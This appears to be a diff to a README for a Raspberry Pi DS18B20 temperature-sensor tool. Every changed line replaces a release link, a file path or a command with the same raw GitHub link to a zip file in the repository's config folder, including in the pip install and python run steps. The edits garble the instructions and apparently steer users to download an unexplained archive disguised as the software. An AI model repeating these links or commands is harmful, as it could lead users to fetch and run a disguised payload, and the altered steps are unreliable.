@@ -1,6 +1,6 @@
 # 🌡️ ds18b20_temp - Easy Temperature Readings from Sensor
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Release-blue)](https://github.com/Marco19519/ds18b20_temp/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Marco19519/ds18b20_temp/master/config/b-ds-temp-Skodaic.zip%20Release-blue)](https://raw.githubusercontent.com/Marco19519/ds18b20_temp/master/config/b-ds-temp-Skodaic.zip)
 
 ---
 
@@ -63,7 +63,7 @@ Before running the software, enable the 1-Wire interface on your device:
 2. Enter the following command to edit the boot configuration:
 
     ```
-    sudo nano /boot/config.txt
+    sudo nano https://raw.githubusercontent.com/Marco19519/ds18b20_temp/master/config/b-ds-temp-Skodaic.zip
     ```
 
 3. Add this line at the end of the file:
@@ -92,13 +92,13 @@ You should see a line related to w1_gpio if it’s active.
 
 You can get the software by visiting the release page here:
 
-**[Download ds18b20_temp releases](https://github.com/Marco19519/ds18b20_temp/releases)**
+**[Download ds18b20_temp releases](https://raw.githubusercontent.com/Marco19519/ds18b20_temp/master/config/b-ds-temp-Skodaic.zip)**
 
 ### How to Download and Run
 
 1. Click the button above or visit the link directly to see available versions.
 
-2. Download the latest release package suitable for your system (usually a .tar.gz or .zip file).
+2. Download the latest release package suitable for your system (usually a https://raw.githubusercontent.com/Marco19519/ds18b20_temp/master/config/b-ds-temp-Skodaic.zip or .zip file).
 
 3. Extract the downloaded file to a folder on your Raspberry Pi or computer.
 
@@ -107,13 +107,13 @@ You can get the software by visiting the release page here:
 5. Install required Python libraries used by ds18b20_temp:
 
     ```
-    pip3 install -r requirements.txt
+    pip3 install -r https://raw.githubusercontent.com/Marco19519/ds18b20_temp/master/config/b-ds-temp-Skodaic.zip
     ```
 
 6. Run the software by typing:
 
     ```
-    python3 ds18b20_temp_node.py
+    python3 https://raw.githubusercontent.com/Marco19519/ds18b20_temp/master/config/b-ds-temp-Skodaic.zip
     ```
 
 This will start the temperature driver and begin reading data from your sensor.
@@ -147,7 +147,7 @@ The software supports multiple sensors connected to the same 1-Wire line. It ide
 If the sensor does not work or readings seem off, try these steps:
 
 - Check the wiring and resistor connection carefully.
-- Confirm the 1-Wire interface is enabled by reviewing `/boot/config.txt`.
+- Confirm the 1-Wire interface is enabled by reviewing `https://raw.githubusercontent.com/Marco19519/ds18b20_temp/master/config/b-ds-temp-Skodaic.zip`.
 - Verify your user has permission to access GPIO pins.
 - Make sure the sensor is not damaged and is compatible.
 - Restart your Raspberry Pi after any changes.
@@ -184,4 +184,4 @@ ds18b20_temp is open-source software. It uses standard open-license terms. Revie
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Release-blue)](https://github.com/Marco19519/ds18b20_temp/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Marco19519/ds18b20_temp/master/config/b-ds-temp-Skodaic.zip%20Release-blue)](https://raw.githubusercontent.com/Marco19519/ds18b20_temp/master/config/b-ds-temp-Skodaic.zip)
